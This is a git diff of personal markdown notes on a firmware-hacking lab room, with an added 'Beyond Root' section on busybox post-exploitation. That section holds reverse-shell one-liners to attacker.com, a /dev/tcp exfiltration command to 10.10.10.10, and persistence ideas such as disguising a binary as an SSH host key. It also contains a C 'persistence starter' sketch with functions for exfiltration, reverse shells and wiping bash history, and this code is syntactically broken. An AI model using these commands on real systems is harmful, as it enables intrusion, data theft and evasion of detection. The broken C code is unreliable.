@@ -8,7 +8,10 @@ Goals:
 - Firmware Hacking revision
 - Sweet points and something different
 Learnt:
+- Dumping Firmware
+- Linux filesystem related extremities - mount to dumped flash memory
 Beyond Root:
+- Busybox 
 
 [Sq00ky](https://github.com/Sq00ky)
 
@@ -147,11 +150,6 @@ Suppose you extract the contents of 6870 with Binwalk and run strings on 799E38.
 ![](extracting6870.png)
 
 
-
-```
-```
-
-
 ## Task 3
 
 Step 1. If /dev/mtdblock0 exists, remove the file/directory and re-create the block device
@@ -281,13 +279,146 @@ A room about Cable Modems may come in the future. However, Cable Modems firmware
 
 ## Beyond Root
 
-At some point I had some nasty reverse shell trying to execute on something and it lead me on a busybox BR 
+At some point I had some nasty reverse shell trying to execute on something and it lead me on a busybox BR.... Little did I know this article is a emerald mine of awesome [pberba.github.io](https://pberba.github.io/security/2021/11/22/linux-threat-hunting-for-persistence-sysmon-auditd-webshell/)
+![1920](linux-persistence-map.png)
+
+https://github.com/Sysinternals/SysmonForLinux
+
 
 https://linux.die.net/man/1/busybox oneliner alternative stagers
-```
-
-```
-
 busybox persistance
 
-busybox reverse shells
+busybox GTFOBins - https://gtfobins.github.io/gtfobins/busybox/
+```bash
+RHOST=attacker.com
+RPORT=12345
+busybox nc -e /bin/sh $RHOST $RPORT
+```
+
+```
+LPORT=12345
+busybox httpd -f -p $LPORT -h .
+```
+
+```
+LFILE=file_to_write
+busybox sh -c 'echo "DATA" > $LFILE'
+```
+
+```
+LFILE=file_to_read
+./busybox cat "$LFILE"
+```
+
+We could also exfiltrate without httpd with cat
+```
+./busybox cat $FILE > /dev/tcp/10.10.10.10/80
+```
+
+- Beacon with jitter
+- Add a cronjob
+- Create a backup for persistence in 	
+	- binary /etc/ssh/ssh_host_cryptox_key
+	- source /etc/ssh/ssh_host_cryptox_key.pub
+- Run something in the background `nohup & `
+
+Very bad C persistence starter
+```c
+#include <stdio.h>
+#include <time.h>
+#include <signal.h>
+
+// NAME
+// EXEC_CTXT // ./cheeseBox -r 10.10.10.10 -p 6969 
+// LHOST
+// LPORT
+// RPORT
+// LPORT
+// DEVSHM_STAT 
+// SRC
+
+void stdoutCmds() 
+{
+    
+    
+} 
+
+void enumSystem()
+{
+    system("date");
+    getenv();
+}
+
+void rmIoCs() 
+{
+        // binary name
+    system("sed -i /root/.bash_history 's/NAME//g' ");
+}
+
+void exfilFile(*char filepath, int port)
+{
+    system("./busybox cat $FILE > /dev/tcp/RHOST/RPORT")
+}
+
+void infilFile(*char filepath, int port)
+{
+    // nice Ippsec cat redirect
+    system("./busybox cat $FILE < /dev/tcp/RHOST/RPORT")
+}
+
+void addCronjob(*char  )
+
+
+void httpdFile(*char filepath, int port) 
+{
+    // check
+    system("busybox httpd -f -p $PORT -h .")
+}
+
+void revShell()
+{
+    system("which nohup");
+    // cd to /dev/shm
+    system("busybox nc -e /bin/sh $RHOST $RPORT")
+    
+    system("busybox nc -e /bin/sh $RHOST $RPORT")
+}
+
+void compCheeseBox(*char sourcefile)
+{
+    // flags
+    system("gcc NAME")
+}
+
+void backupCheeseBox()
+{
+    unwrapSrc();
+    // flags
+    system("mv src.c > /etc/ssh/ssh_host_cryptox_key.pub");
+    compCheeseBox(src.c);
+    system("mv bin > /etc/ssh/ssh_host_cryptox_key.pub");
+}
+
+void unwrapSrc() 
+{
+    system("echo SRC > src.c");
+}
+
+
+int main(void)
+{
+    system("gcc --version");
+    system("mount | grep shm");   
+    
+    // Beacon and Jitter and Listen and Cheese and Box
+    while  {
+        
+    } else {
+        exit();
+    }
+
+    
+    exit();
+    return 0;
+}
+```
